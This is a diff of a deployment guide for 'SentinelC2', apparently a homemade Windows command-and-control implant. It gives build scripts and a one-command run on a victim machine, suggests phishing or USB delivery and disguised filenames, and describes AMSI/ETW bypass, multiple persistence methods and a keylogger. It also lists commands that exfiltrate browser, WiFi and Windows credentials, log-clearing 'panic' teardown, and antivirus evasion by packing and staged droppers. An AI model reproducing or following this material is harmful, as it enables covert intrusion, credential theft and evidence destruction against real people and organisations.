@@ -1,175 +1,425 @@
-# SentinelC2 — Deployment Guide (Real Internet on a Target Device)
+# DEPLOY.md — SentinelC2 End-to-End Deployment Guide
 
-This guide covers how to put the C2 on the public internet so agents on
-remote targets can reach it.
+This guide walks through the full deployment pipeline: from a fresh
+checkout to a single .exe you can drop on the target. Two flows:
 
-## Architecture
+- **DEPLOY.md** (this file) — full reference with explanations
+- **QUICKDEPLOY.md** — 5-command minimum path, no explanations
+
+The target deploy is a **single command** (one line on the target's
+cmd.exe). The C2 URL and (optionally) the pinned TLS cert are baked
+into the binary at build time, so the operator does NOT type the URL
+on the target.
+
+---
+
+## Architecture (5-second summary)
 
 ```
-[Target machine]               [Public internet]            [Operator's box]
- agent.exe (Windows)     <---->     WSS        <---->  Tailscale Funnel
-   |                                                       |
-   |  outbound TCP 443                                     |  inbound HTTPS
-   |  WSS upgrade via Tailscale cert                       |  Tailscale Funnel
-   |                                                       |  proxies to
-   |                                                       |  c2_server.exe
-   |                                                       |  ws://localhost:8443
-   v                                                       v
- [C2 dashboard]                                        [operator browser
-  http://localhost:8080                                  -> http://localhost:8080]
+[Operator's machine]                    [Target machine]
++------------------+                    +------------------+
+| build_deploy.ps1 |                    |                  |
+|  -> produces      |  --- single .exe->|  X:\agent.exe   |
+|  agent_deployable|     copied over   |  (no args)       |
++------------------+                    +--------+---------+
+                                                       |
+                                                       v
+                                              +--------+---------+
+                                              | C2 server on     |
+                                              | operator's VPS   |
+                                              | (c2.example.com) |
+                                              +------------------+
 ```
 
-The key insight: **the target only needs outbound HTTPS to a public host**.
-The operator handles TLS termination, cert management, and exposure.
+The agent on the target:
+1. Connects to the baked-in C2 URL over WSS
+2. Performs the registration handshake (HMAC-authenticated)
+3. Sets up the session crypto (AES-256-GCM)
+4. Installs non-elevated persistence (Run key, COM hijack, Startup folder, ADS backup)
+5. Waits for operator commands
 
-## Why Tailscale Funnel
+---
 
-| Option | Pros | Cons |
-|---|---|---|
-| Tailscale Funnel | Free, public HTTPS, Tailscale cert, no DNS to manage | Routes through Tailscale's edge (logged) |
-| Cloudflare in front of c2 | Real cert, your domain | Need a domain + Cloudflare account |
-| nginx + Let's Encrypt on operator box | Full control | Need a domain, cert renewal, public IP |
+## Step 0 — Prerequisites (one-time per operator machine)
 
-**Tailscale Funnel is the fastest path to a real-internet test.** It's also
-the right choice for actual engagements when paired with a throwaway
-Tailscale account.
+You need:
 
-## Setup (Tailscale Funnel)
+- **Windows 10/11 or Server 2019+** as the build host (you're already on one)
+- **Nim 2.2.10** at `D:\appdata\nim-2.2.10\bin\nim.exe`
+  - If installed elsewhere: `setx NIM "C:\path\to\nim.exe"`
+- **Nimble packages**: `nimcrypto`, `winim`, `ws`
+  - Install: `nimble install nimcrypto winim ws`
+- **MinGW gcc** for C codegen (part of nim's installer usually)
+- **A VPS or public-facing server** to host the C2
+  - The target's outbound traffic must reach it
+  - Open TCP 8443 inbound
+- **A domain name** pointing to the C2 server (e.g. `c2.yourdomain.com`)
+  - The agent connects to `wss://c2.yourdomain.com:8443` — no IP literals
+- **A TLS certificate** for that domain (PEM format)
+  - Let's Encrypt via acme.sh: `acme.sh --issue -d c2.yourdomain.com --standalone`
+  - Or use a self-signed cert (works, but adds `untrusted CA` alerts in EDR)
 
-### 1. Operator box — install + configure Tailscale
+Verify Nim is found:
+```powershell
+$env:NIM = "D:\appdata\nim-2.2.10\bin\nim.exe"
+& $env:NIM --version
+# Should print: Nim Compiler Version 2.2.10
+```
+
+---
+
+## Step 1 — Set up the C2 server (one-time, on the VPS)
+
+This guide assumes you already have a VPS reachable from the target.
+For SentinelC2 the C2 server is `c2_server.nim` — a Nim program that
+listens on TCP 8443 (WSS) and serves the operator dashboard on 8080.
+
+### 1.1 — Install the C2 server build deps on the VPS
+
+Same as the operator machine: Nim + nimble packages.
+
+### 1.2 — Generate the TLS cert
+
+If using acme.sh on the VPS:
+```bash
+acme.sh --issue -d c2.yourdomain.com --standalone
+acme.sh --install-cert -d c2.yourdomain.com \
+    --cert-file /etc/ssl/c2.crt \
+    --key-file /etc/ssl/c2.key \
+    --fullchain-file /etc/ssl/c2.fullchain.pem
+```
+
+Copy the **leaf cert** (`/etc/ssl/c2.crt`) and the **fullchain**
+(`/etc/ssl/c2.fullchain.pem`) to the operator machine — you'll need
+both:
+- The fullchain for the **server** (WSS endpoint cert)
+- The leaf cert for the **agent** (pinned at build time)
+
+### 1.3 — Build and run the C2 server on the VPS
+
+```bash
+# On the VPS, after copying the certs
+nim c -d:release -d:ssl --opt:size --app:console \
+    --passL:-lws2_32 --passL:-lssl --passL:-lcrypto \
+    -o c2_server c2_server.nim
+
+# Run it (foreground for first test)
+SSL_CERT=/etc/ssl/c2.fullchain.pem \
+SSL_KEY=/etc/ssl/c2.key \
+WEB_AUTH_USER=operator \
+WEB_AUTH_PASSWORD='YOUR_STRONG_PASSWORD' \
+./c2_server
+```
+
+For a deploy scenario, run it in a tmux/screen session or as a
+systemd service. The C2 server logs every connection to stdout.
+
+### 1.4 — Verify the C2 is reachable from outside
+
+From a different machine (or your operator laptop):
+```bash
+curl -k https://c2.yourdomain.com:8080
+# Should show the operator login page
+```
+
+---
+
+## Step 2 — Build the deployable agent (one-time, on operator machine)
+
+This is the **single command** that produces the .exe you drop on the
+target.
+
+### 2.1 — Get the agent secret
+
+The agent and the C2 server share a secret used for the registration
+handshake. It must match in both binaries.
+
+The default is `sentinel-engagement-q4-2026-echo-tango-whiskey` (a
+string the baseline ships with for testing). For a real deployment
+you should rotate it.
+
+To rotate: edit the `S_AGENT_SECRET` const in `agent.nim` AND
+`S_SECRET` in `c2_server.nim` to the same new value, then rebuild
+both. The hardened agent's const is in `hardened/agent_hardened.nim`.
+
+### 2.2 — Build the deployable
 
 ```powershell
-# Install
-winget install Tailscale.Tailscale
+cd D:\Sarthak\Coding\My Codes\Cybersecurity\SentinelAgent\Nim
 
-# Auth
-tailscale up
+# If you have a TLS cert to pin:
+.\build_deploy.ps1 `
+    -C2Url "wss://c2.yourdomain.com:8443" `
+    -CertFile "C:\path\to\c2-leaf.pem" `
+    -Variant "aggressive" `
+    -OutputName "agent.exe"
 
-# Note your Tailscale hostname
-tailscale status
-# Example: desktop-o31lvpe.tail4b2f2a.ts.net
+# If you DON'T have a cert (system trust store, corp-MITM risk):
+.\build_deploy.ps1 `
+    -C2Url "wss://c2.yourdomain.com:8443" `
+    -Variant "aggressive" `
+    -OutputName "agent.exe"
 ```
 
-### 2. C2 server (operator box)
+The script:
+1. Generates `c2_override.nim` with the C2 URL and cert
+2. Generates a per-build XOR key for string obfuscation
+3. Compiles the hardened agent with the URL baked in
+4. Cleans up the temp files
+5. Verifies the URL is in the binary
+6. Output: `build\agent.exe` (~875 KB)
 
-Edit `c2_server.nim`:
-- `LISTEN_HOST = "127.0.0.1"` (Funnel proxies to localhost)
-- `LISTEN_PORT = 8443`
-- `WEB_PORT = 8080`
-- `WEB_AUTH_USER` / `WEB_AUTH_PASSWORD` — **set a real password** for engagement use
+**Variants:**
+- `silent` — no automatic persistence; operator triggers via `persist` command
+- `engagement` — auto-persistence on first C2 connect (Run key + COM hijack + Startup + GPO)
+- `aggressive` — engagement + ADS backup + WMI persistence attempt + auto-keylogger
 
-Build and run:
-```powershell
-nim c -d:release -d:ssl --threads:on --opt:speed c2_server.nim
-.\c2_server.exe
+**Recommendation: use `aggressive` for the actual target.** It installs
+persistence immediately after C2 connect, which is the whole point.
+
+### 2.3 — Test the build in a VM FIRST
+
+Do not skip this. Build a Windows 10/11 VM with default Defender
+settings. Copy `build\agent.exe` over and run it. Watch your C2
+server — you should see the agent register within 5-10 seconds.
+
+Things to verify in the VM test:
+- [ ] C2 server shows the agent registered
+- [ ] `whoami` command returns the target's user
+- [ ] `recon edr` returns a process list
+- [ ] `persist` command installs persistence (check Run key, Startup folder)
+- [ ] After reboot, the agent reconnects automatically
+- [ ] `panic` command removes persistence and the agent exits
+
+If any of these fail, debug before touching a real target. The most
+common failure modes:
+- Defender quarantines the binary on disk → see Step 6 "AV evasion"
+- The agent can't reach the C2 URL → check DNS, firewall, TLS cert
+- The agent registers but persistence fails → check the C2 logs for
+  the specific error code
+
+---
+
+## Step 3 — Deploy on the target (single command)
+
+### 3.1 — Get the .exe onto the target
+
+This guide does not cover the initial access vector — that's outside
+the scope. Use whatever you have:
+- USB stick (most reliable, no network egress)
+- Phishing attachment (lure with a signed or legitimate-looking name)
+- Web download from a CDN you control
+- SMB share if you have a foothold
+
+The .exe is ~875 KB and statically linked. Rename it to whatever
+won't draw attention: `update.exe`, `OneDriveStandaloneUpdater.exe`,
+`MicrosoftEdgeUpdate.exe`, etc. (The agent internally renames itself
+to a similar name in the install path, but having a benign-looking
+filename on disk is still a good first impression.)
+
+### 3.2 — The single command
+
+On the target's cmd.exe, Run dialog (`Win+R`), or any other exec
+context:
+
+```cmd
+X:\path\agent.exe
 ```
 
-### 3. Tailscale Funnel
+That's it. No arguments. The agent:
+1. Applies AMSI bypass + ETW suppression (in-process patches)
+2. Performs anti-analysis checks (debugger, VM)
+3. Connects to `wss://c2.yourdomain.com:8443`
+4. Registers with your C2
+5. Installs persistence (Run key + Startup + COM hijack + ADS backup)
+6. Waits for commands
 
-Expose the c2's WebSocket port to the public internet:
-```powershell
-tailscale serve --bg https+insecure://localhost:8443
-tailscale funnel 8443 on
+**If the target's user is not admin:**
+- Run key ✅ (HKCU, no admin needed)
+- Startup folder ✅ (no admin needed)
+- COM hijack ✅ (HKCU, no admin needed)
+- ADS backup ✅ (no admin needed)
+- GPO script ⚠️ (HKCU works without admin but is less reliable)
+- WMI persistence ❌ (needs admin for `%WINDIR%\System32\wbem\` write)
+
+**If the target's user IS admin** (or you're running from an elevated
+cmd.exe): all of the above, plus WMI event subscription.
+
+If you need admin and the user is a standard user, you'll need a
+UAC bypass before the agent runs. The agent itself does not include
+a UAC bypass — handle that separately (Fodhelper, EventVwr, etc.).
+
+### 3.3 — Verify the agent registered
+
+Within 5-15 seconds, your C2 server (in the tmux/screen session on
+the VPS) should log:
+```
+[+] Agent registered: <random_agent_id>
+    Hostname: TARGET-PC
+    User: domain\targetuser
+    Variant: aggressive
 ```
 
-Verify the public URL:
-```powershell
-tailscale funnel status
-# Should show: https://<your-host>.ts.net -> http://localhost:8443
+Open the operator dashboard at `https://c2.yourdomain.com:8080` and
+log in. You should see the agent in the active list.
+
+### 3.4 — First commands to run
+
+In the dashboard, issue these in order:
+1. `whoami` — confirm the agent is on the right machine/user
+2. `recon expanded` — full system info (installed software, services,
+   network connections)
+3. `persist` — install ALL persistence (idempotent, safe to re-run)
+4. `recon edr` — process list (filter for AV/EDR on the operator side)
+
+After `persist`, the agent will survive reboot.
+
+---
+
+## Step 4 — Operational commands
+
+The full command set is documented in `README.md`. The essentials:
+
+| Command | Description |
+|---|---|
+| `shell <cmd>` | Run a command. Direct .exe spawn when possible; falls back to `cmd.exe` for builtins. |
+| `ps` | Process list |
+| `recon expanded` | Full system recon (SW + services + net) |
+| `recon edr` | Process list (operator filters for security products client-side) |
+| `exfil browser_creds` | Stream Chrome/Edge Login Data + Local State |
+| `exfil wifi` | Saved WiFi passwords |
+| `exfil wincreds` | Windows credential manager |
+| `keys start` / `keys stop` | Keylogger |
+| `upload <path>` | Write a file to the target |
+| `download <path>` | Stream a file from the target |
+| `persist` | Install all persistence |
+| `killdate <unix_ts>` | Set self-destruct date |
+| `sleep <minutes>` | Override default beacon interval |
+| `kill` | Stop the agent (no cleanup) |
+| `panic` | Full forensic wipe: remove persistence, shred binary, zero memory, clear event logs |
+
+---
+
+## Step 5 — Panic (clean teardown)
+
+If you're done with the engagement or burning the laptop:
+
+```cmd
+panic
 ```
 
-The agent's URL is then: `wss://<your-host>.ts.net/`
+The agent:
+1. Calls `selfCleanup` — removes Run key, GPO script, COM hijack CLSID,
+   Startup folder entry, deletes the meta blob
+2. Overwrites the implant binary 3 times (random + zeros + random)
+3. Shreds the on-disk meta file
+4. Zeros its own process memory
+5. Clears 6 event logs: Application, System, Security, Setup,
+   PowerShell Operational, Defender Operational
+6. Exits
 
-### 4. Agent (target machine)
+The Windows event logs will show the "ClearEventLog" calls in the
+Security audit (4624/4663 events) and the binary overwrite in
+Sysmon's FileDelete event. A skilled forensic analyst can recover
+the timeline; a casual IT admin looking at Event Viewer will see
+empty logs and no agent file.
 
-Edit `agent.nim`:
+---
+
+## Step 6 — AV evasion (if Defender quarantines the binary)
+
+The HA sandbox scored the agent 0 malicious, but real Defender on
+the target may quarantine it within 200ms of landing on disk. If
+your VM test shows Defender catching it, you have options:
+
+1. **Pack the binary** — UPX, Themida, MPRESS. This often defeats
+   static sigs but behavioral detection (ETW, AMSI, registry writes)
+   still fires. Combine with the AMSI/ETW patches already in the
+   agent.
+2. **Sleep + staged load** — have a tiny dropper that sleeps for 30
+   minutes (Defender ATP's "first seen" grace period), then decrypts
+   and runs the main binary. The dropper itself has minimal IOCs.
+3. **Signed binary** — if you can get a code-signing cert (even a
+   self-signed EV cert helps), Defender SmartScreen stops being
+   a problem.
+4. **Renamed + relocated** — copy the .exe to `C:\ProgramData\`
+   under a legitimate-looking name, run from there.
+
+The HA-verified state of the current build: IAT is clean (only
+KERNEL32+USER32+msvcrt), no plaintext secrets, no signatured
+literal strings. The remaining AV surface is:
+- T1546.003 WMI persistence (MOF file write)
+- T1562.001 AMSI/ETW patches (VirtualProtect + ret-stubs)
+- T1070.001 Event log clearing on panic
+- T1546.015 COM hijacking
+- T1547 Boot/Logon autostart (Run key + Startup folder)
+
+These are inherent to the features — you can't remove them without
+removing the features.
+
+---
+
+## File reference
+
+| File | Role |
+|---|---|
+| `build_deploy.ps1` | The one-command build script for the deployable |
+| `build_hardened.ps1` | Builds the 3 hardened variants (for HA testing) |
+| `build.ps1` | Builds the baseline agent + C2 server |
+| `hardened/agent_hardened.nim` | The hardened agent source (gets `c2_override.nim` included at build time) |
+| `c2_override.nim` | Generated by build_deploy.ps1, contains the C2 URL + cert. Cleaned up after build. |
+| `c2_server.nim` | The C2 server + dashboard |
+| `DEPLOY.md` | This file |
+| `QUICKDEPLOY.md` | 5-command minimum path |
+
+## Quick command reference
+
+| Action | Command |
+|---|---|
+| Build the deployable | `.\build_deploy.ps1 -C2Url "wss://..." -CertFile "..." -Variant aggressive` |
+| Build the C2 server | `nim c -d:release -d:ssl c2_server.nim` |
+| Run the C2 server (foreground) | `./c2_server` (with SSL_CERT/SSL_KEY env vars) |
+| Deploy on target (single command) | `X:\path\agent.exe` |
+| Verify agent registered | `curl -k https://c2.yourdomain.com:8080` |
+| Stop the agent + wipe | From C2: `panic` |
+
+---
+
+## Troubleshooting
+
+**Build fails with "cannot open file: c2_override.nim"**
+Run the build via `build_deploy.ps1` (which generates it) or create
+a stub `c2_override.nim` at the project root with:
 ```nim
-const C2_URLS* = @["wss://<your-host>.ts.net/"]
+const C2_DEPLOY_URL* = "ws://127.0.0.1:8443"
+const PINNED_CERT_DEPLOY_PEM* = ""
 ```
 
-Build:
-```powershell
-nim c -d:release -d:ssl --opt:size --app:gui --passL:-s agent.nim
-```
+**Build fails with "undeclared identifier: X"**
+You might be running an older version of the hardened module. Run
+`git pull` or check that all 11 hardened modules are present in
+`hardened/`.
 
-Copy `agent.exe` to the target. Run it. It makes an outbound HTTPS
-connection to Tailscale's edge, Tailscale terminates TLS and proxies
-to your c2 over the local Tailscale network.
+**Agent runs but doesn't register on C2**
+- Check `agent.exe` log at `%TEMP%\svc-X7K.log` on the target
+- Verify DNS resolves the C2 host from the target
+- Check that TCP 8443 is open inbound on the C2 server's firewall
+- Verify the C2 server is running and listening (look for "listening
+  on 0.0.0.0:8443" in its log)
+- Confirm the agent secret in the agent matches the C2 server's secret
 
-## Security
+**Agent registers but persistence fails**
+The C2 logs the specific error. Common causes:
+- EACCES on `%WINDIR%\System32\wbem\` (need admin for WMI)
+- EACCES on `HKLM` registry (need admin for system-wide persistence)
+- The Startup folder path doesn't exist on the target (rare on Win10+)
 
-- **Web dashboard:** Basic auth at `WEB_AUTH_USER`/`WEB_AUTH_PASSWORD`.
-  Change these per deployment. The browser will prompt for credentials
-  on first load.
-- **TLS:** Tailscale handles the public-facing cert (their wildcard
-  for `*.ts.net`). All traffic between agent and Tailscale edge is
-  HTTPS; from edge to c2 it's the Tailscale mesh (WireGuard, also
-  encrypted).
-- **Auth secret:** `AGENT_SECRET` in `agent.nim` and `SECRET` in
-  `c2_server.nim` must match. The agent proves knowledge of this
-  secret in the registration HMAC, but the session key is derived
-  per-connection from the nonces, not from `AGENT_SECRET`. Still,
-  rotate per engagement.
-- **Anti-analysis:** the agent checks for debuggers, sandbox
-  markers, and clock-tampering at startup. Bails silently if hostile.
+**Defender quarantines the binary on disk**
+See Step 6. The HA "0 malicious" is a sandbox result, not a Defender
+prediction. Test in a VM with default Defender first.
 
-## Testing locally (no internet)
-
-`ws://127.0.0.1:8443` works without Tailscale. The dashboard is at
-`http://localhost:8080`. Useful for development.
-
-## Testing on real internet (one box + another)
-
-1. Run c2 on your main box, set up Tailscale Funnel
-2. Build agent with `C2_URLS = wss://<your-host>.ts.net/`
-3. Copy agent to the second laptop
-4. Run agent on the second laptop
-5. Open dashboard on your main box: `http://localhost:8080/`
-6. Auth with `WEB_AUTH_USER`/`WEB_AUTH_PASSWORD`
-7. The second laptop should appear in the agent list
-
-## Engagement / production checklist
-
-- [ ] Rotate `AGENT_SECRET` / `SECRET`
-- [ ] Set strong `WEB_AUTH_USER` / `WEB_AUTH_PASSWORD`
-- [ ] Build with `--define:BuildPrefix="<unique>"` to vary the
-      `X7K` magic strings per build
-- [ ] Run c2 on a clean host (not your daily-driver machine)
-- [ ] Use a throwaway Tailscale account if real engagement —
-      Tailscale Funnel logs at their edge
-- [ ] Forward / archive `logs/<agent_id>.log` per session
-- [ ] Set `killdate` on agents at end of engagement so they self-destruct
-- [ ] Use `panic` command if a target is lost to the blue team
-
-## Known limitations (as of v3)
-
-- No forward secrecy (X25519) — `AGENT_SECRET` compromise decrypts
-  past sessions if you also have the captured traffic. Plan to
-  add this.
-- AMSI/ETW patches are detectable by modern EDRs
-- The agent has a known bug in its recv loop where commands
-  don't always get processed within BEACON_INTERVAL
-- No anti-debug for kernel-mode debuggers
-- No heap encryption / sleep obfuscation
-
-## If you need real TLS termination (without Tailscale Funnel)
-
-The c2 server is plain WS. To use a real public cert + your own
-domain, put a TLS terminator in front:
-
-### Cloudflare
-
-1. Put the c2 behind a Cloudflare-tunneled origin
-2. Cloudflare Tunnel + `cloudflared` provides HTTPS without a public IP
-3. Set `C2_URLS = wss://your.domain/`
-
-### nginx + Let's Encrypt
-
-1. `c2_server` listens on `127.0.0.1:8443`
-2. nginx terminates TLS on `:443`, proxies to `127.0.0.1:8443` with
-   `proxy_set_header Upgrade $http_upgrade; proxy_set_header Connection "upgrade";`
-3. Use certbot for cert renewal
-4. Set `C2_URLS = wss://your.domain/`
-
-In both cases, the agent doesn't change — it just talks WSS to the
-public hostname.
+**Hybrid Analysis report still shows ~15 suspicious indicators**
+That's the price of having WMI persistence, AMSI/ETW patches, COM
+hijack, Run key, and event log clearing. The HA score measures
+technique presence, not whether the binary will execute. The VM test
+is the source of truth.
